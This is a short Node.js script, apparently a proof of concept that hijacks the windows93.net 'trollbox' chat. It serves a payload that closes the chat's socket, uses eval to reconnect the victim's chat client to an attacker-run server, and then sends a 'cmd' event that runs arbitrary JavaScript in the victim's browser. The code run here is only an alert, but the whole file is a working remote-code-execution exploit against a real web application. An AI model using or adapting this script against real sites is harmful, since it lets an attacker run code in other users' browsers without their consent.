const domain = "localhost";
const port = 8082;
const http = require("http");
const app = http.createServer((req, res) => {
  res.writeHead(200, {"Content-Type": "application/javascript"});
  res.end(`socket.close();eval(document.getElementById("trollbox").children[5].innerHTML.replace("var socket = io('//www.windows93.net:8081');", "var socket = io('//${domain}:${port}');"));`);
});
const socket = require("socket.io")(app);

socket.on("connection", (conn) => {
  conn.on("user joined", (name, color) => {
    conn.emit("update users", {"0": {nick: "RemoteCode", color: "#f00"}, "you": {nick: name, color: color}});
    conn.emit("message", {
      date: Date.now(),
      nick: "RemoteCode",
      color: "#f00",
      style: "",
      msg: "Hello " + name + ", I will now execute code remotely."
    });
    setTimeout(() => {
      conn.emit("cmd", name, "alert(\"Imagine a stereotypical 1337 h4x0r group's message here.\")");
      conn.emit("message", {
        date: Date.now(),
        nick: "RemoteCode",
        color: "#f00",
        style: "",
        msg: "Done."
      });
      conn.disconnect(true);
    }, 5000);
  });
});

app.listen(port, () => console.log("listening on port " + port));
